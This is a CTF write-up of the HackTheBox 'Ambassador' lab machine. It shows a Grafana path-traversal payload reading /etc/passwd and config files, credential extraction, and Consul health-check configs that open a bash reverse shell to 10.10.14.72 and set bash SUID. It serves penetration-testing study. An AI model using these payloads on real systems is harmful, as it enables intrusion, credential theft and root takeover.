# HackTheBox - Ambassador

## NMAP

```bash
Nmap scan report for 10.10.11.183                                                                                
Host is up (0.19s latency).                                                                                      
Not shown: 996 closed tcp ports (reset)                                                                          
PORT     STATE SERVICE VERSION                                                                                   
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)                              
| ssh-hostkey:                                                                                                   
|   3072 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 (RSA)                                                   
|   256 80:a4:c5:2e:9a:b1:ec:da:27:64:39:a4:08:97:3b:ef (ECDSA)                                                  
|_  256 f5:90:ba:7d:ed:55:cb:70:07:f2:bb:c8:91:93:1b:f6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-generator: Hugo 0.94.2
|_http-title: Ambassador Development Server
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp open  ppp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
| mysql-info:                               
|   Protocol: 10 
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 70     
|   Capabilities flags: 65535                                                                                    
|   Some Capabilities: SupportsCompression, IgnoreSigpipes, FoundRows, IgnoreSpaceBeforeParenthesis, LongPassword, DontAllowDatabaseTableColumn, SupportsTransactions, SupportsLoadDataLocal, InteractiveClient, Speaks41ProtocolO
ld, SwitchToSSLAfterHandshake, Speaks41ProtocolNew, LongColumnFlag, Support41Auth, ConnectWithDatabase, ODBCClient, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit               
|   Salt: j(EK:\x1F\x14x)\x0D6\x189).\x03       {e!

```

## PORT 80 (HTTP)
From port 80 we'll see a page talking about using `developer` account to login to SSH

![](https://i.imgur.com/afls5Vn.png)


Fuzzing on this site didn't really returned something

![](https://i.imgur.com/QHJ99RU.png)

## PORT 3000 (Grafana)

On port 3000 there's an instance of grafana 8.2.0 running 

![](https://i.imgur.com/J9JRUpL.png)

## Foothold
We don't know the password but we can check for vulnerabilities for version 8.2.0, which turns out to be vulnerable to Local FIle Inclusion

![](https://i.imgur.com/HnhHln2.png)

To exploit this we can make a request to `public/plugins/plugin-name` and then followed by the LFI payload, using a script from a github https://github.com/Gabriel-Lima232/Grafana-LFI-8.x this script is is lopping through the `plguins` to find the plugins which are available and make the request to read any local file you want

![](https://i.imgur.com/HPtepIa.png)

![](https://i.imgur.com/y6l8FaY.png)

We can exploit this manually 

```bash
http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd
```

![](https://i.imgur.com/OeK7kNu.png)

Reading `/var/lib/grafana/grafana.db` will show us the database for garfana having the admin hash

![](https://i.imgur.com/u4A18aG.png)

We can read ``/etc/grafana/grafana.ini`` which has the admin login password

![](https://i.imgur.com/5swndam.png)

![](https://i.imgur.com/R4rnQW6.png)

We can login with the `admin` user with password we found

![](https://i.imgur.com/Msw5O23.png)

But there wasn't anything from where we could move forward so this was most likely a rabbithole, following this article to decrypt the password https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/, we can load the sqlite databse through `sqlite3`

![](https://i.imgur.com/Zw1LJDc.png)

This is the password for mysql database for grafana user 

![](https://i.imgur.com/JoQCpAh.png)

From `whackywidget` database we can find the password for developer user which is in base64 encoding you could tell as at the end there's `==`

![](https://i.imgur.com/H0sTi76.png)

We can just decode it from base64 and get the plaintext

![](https://i.imgur.com/Q1jgxWF.png)
![]()
Having the password we can login through ssh

![](https://i.imgur.com/2aUFUHu.png)

With `sudo -l` we can try checking if this user can run anything as root or as other user

![](https://i.imgur.com/uLkhxtG.png)

## Privilege Escalation
Running `pspy` it was removing the config file of `consul` which gave away that root must be something to do with it 

![](https://i.imgur.com/bBZzMwj.png)

Going to `/opt` directory there's a directory named `my-app` which has `.git` so we can check the commits which reaveals a token 

![](https://i.imgur.com/ZGhE5Pr.png)

This token belongs to consul through which we can make API calls and this service is running on port 8500

![](https://i.imgur.com/KKGa6pi.png)

This can be exploited by creating sevice executing a reverse shell using the token we have found,it can be done in two ways 

## Method 1
To exploit it manually we have to create a config file for heatlh checks which will execute commands, so we'll create the config file in `/etc/consul.d/config.d` , the format of the config file can be in `HCL` or `JSON`

![](https://i.imgur.com/ahym7v4.png)

We'll first create a bash script to trigger the reverse shell

```bash
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.72/2222 0>&1'
```

![](https://i.imgur.com/HhcftKi.png)

Next creating the health check script

```json
check = {
  id = "1"
  name = "priuwv-euwsc"
  args = ["/bin/bash","/tmp/shell.sh"]
  interval = "10s"
  timeout = "1s"
}

```
![](https://i.imgur.com/3Sk4Tib.png)

Now copying this file `/etc/consul.d/config.d/` as we the folder is owned by developer group

```bash
cp ./test.hcl /etc/consul.d/config.d/
```

And we are going to register the health check and realod to check for new service or update

```bash
consul services register -token=bb03b43b-1d81-d62b-24b5-39540ee469b5 /etc/consul.d/config.d/test.hcl

consul reload -token=bb03b43b-1d81-d62b-24b5-39540ee469b5
```

![](https://i.imgur.com/bL56h7G.png)

This will give us a shell back as root user but the connection just closes

![](https://i.imgur.com/GxZZIBE.png)

So we could make bash a SUID instead or could put a ssh in root's directory, so I went with making SUID

```bash
check = {
  id = "1"
  name = "priuwv-euwsc"
  args = ["/usr/bin/chmod","4777","/bin/bash"]
  interval = "10s"
  timeout = "1s"
}
```

Or with `+s`

```json
check = {
  id = "1"
  name = "priuwv-euwsc"
  args = ["/usr/bin/chmod","+s","/bin/bash"]
  interval = "10s"
  timeout = "1s"
}

```
Again copying it, registering and reloading to check the new scripts

![](https://i.imgur.com/OwFZXp5.png)

With `bash -p` we can run bash as the user who owns it which is root

![](https://i.imgur.com/OJ6gwoL.png)

## Method 2

I found an exploit for consul on `metasploit` and in order to use that we would first need to port forward 8500 through `chisel` so that we can access it 

![](https://i.imgur.com/izp4i52.png)

![](https://i.imgur.com/qQpF8zb.png)

Making sure if we are able to make a request

![](https://i.imgur.com/EZLFbAM.png)

Now firing up msf and using the exploit `exploit/multi/misc/consul_service_exec`

![](https://i.imgur.com/ObVfk7D.png)

![](https://i.imgur.com/ncVkrDn.png)

## References

- https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/
- https://github.com/Gabriel-Lima232/Grafana-LFI-8.x
- https://github.com/jas502n/Grafana-CVE-2021-43798
- https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/
- https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/misc/consul_service_exec
- https://www.consul.io/docs/discovery/checks
- https://www.consul.io/docs/discovery/services
- https://www.consul.io/commands/services/register

